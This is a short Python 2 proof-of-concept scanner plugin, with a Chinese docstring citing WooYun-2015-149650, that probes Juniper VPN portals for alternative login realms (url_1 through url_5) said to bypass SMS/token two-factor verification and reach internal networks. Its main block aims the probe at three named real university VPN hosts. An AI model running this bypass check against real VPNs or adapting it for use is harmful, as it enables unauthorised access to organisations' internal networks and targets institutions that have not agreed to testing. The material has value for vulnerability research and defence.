#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Juniper VPN 存在缺陷可绕过短信token验证导致漫游内网
Author    :  a
mail      :  a@lcx.cc
 
refer     :   WooYun-2015-149650
juniper一般是通过AD域验证或者预设账号验证，但是现在安全意识越来越好了，厂商们纷纷加入了短信，动态token验证，这样即使有了对应的账号密码也无法登陆vpn
想绕过动态码验证，更改url_default为url_1或者url_2或者3,4,5只要厂商自定义了其他页面，那就可能突破成功
"""
import urlparse

def assign(service, arg):
    if service == 'juniper_vpn':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payloads=('dana-na/auth/url_2/welcome.cgi',
              'dana-na/auth/url_1/welcome.cgi',
              'dana-na/auth/url_3/welcome.cgi',
              'dana-na/auth/url_4/welcome.cgi',
              'dana-na/auth/url_5/welcome.cgi'
              )
    for p in payloads:
        url = arg + p
        code2, head, res, errcode, _ = curl.curl2(url )
        if (code2 ==200) and ('action="login.cgi" method="POST' in res):  
            security_warning(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('juniper_vpn', 'https://vpn.suda.edu.cn/')[1])  
    audit(assign('juniper_vpn', 'https://vpn.nju.edu.cn/')[1])
    audit(assign('juniper_vpn', 'https://vpn2.seu.edu.cn')[1])